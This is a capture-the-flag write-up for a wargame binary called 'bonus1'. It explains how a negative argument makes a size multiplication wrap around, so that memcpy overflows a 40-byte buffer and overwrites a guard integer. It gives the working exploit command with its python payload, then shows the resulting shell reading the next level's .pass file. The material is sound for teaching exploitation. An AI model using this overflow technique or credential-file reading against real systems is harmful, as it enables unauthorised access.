# Bonus1 Exploit Guide

## Steps

### 1. Understand the Vulnerability

The binary `bonus1` has a vulnerability that allows a buffer overflow. We need to exploit this to execute a shell.

### 2. Analyze the Source Code

The key operations in the `main` function are:
- Convert the first argument to an integer using `atoi`.
- Check if the integer is less than or equal to 9.
- Copy the second argument to a buffer using `memcpy`.
- If the integer equals `0x574f4c46`, execute a shell.

### 3. Determine the Exploit Strategy

To exploit this, we need to:
- Use a negative number for the first argument that results in an overflow when multiplied by 4.
- Overwrite the buffer and the integer variable to trigger the shell execution.

### 4. Calculate the Appropriate Negative Value

We need the result of `num * 4` to overflow to 44 bytes, covering the 40-byte buffer plus 4 bytes to overwrite the integer.

1. **Determine the Overflow Calculation**:
    ```
    num * 4 = 44 - (UNSIGNED_INT_MAX + 1)
    num * 4 = 44 - 4294967296
    num * 4 = -4294967252
    num = -4294967252 / 4
    num = -1073741813
    ```

2. **Binary Representation Check**:
    - `-1073741813` in binary properly aligns to cause the overflow.

### 5. Craft the Exploit Command

1. **First Argument**:
    - Use `-1073741813` as the first argument.
2. **Second Argument**:
    - Construct a payload to fill the buffer and overwrite the integer.

```sh
./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

- `-1073741813`: The calculated negative value.
- `$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')`: The payload to fill the buffer with 40 'A's and then `0x574f4c46` (little-endian) to overwrite the integer.

### 6. Execute the Exploit

Run the crafted payload:
```sh
./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

### 7. Verify the Exploit

If successful, the command should trigger a shell:
```sh
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
```
Retrieve the flag from the output.

### Summary

By carefully calculating the overflow value and crafting the payload, we exploit the buffer overflow vulnerability in `bonus1` to execute a shell and retrieve the necessary flag.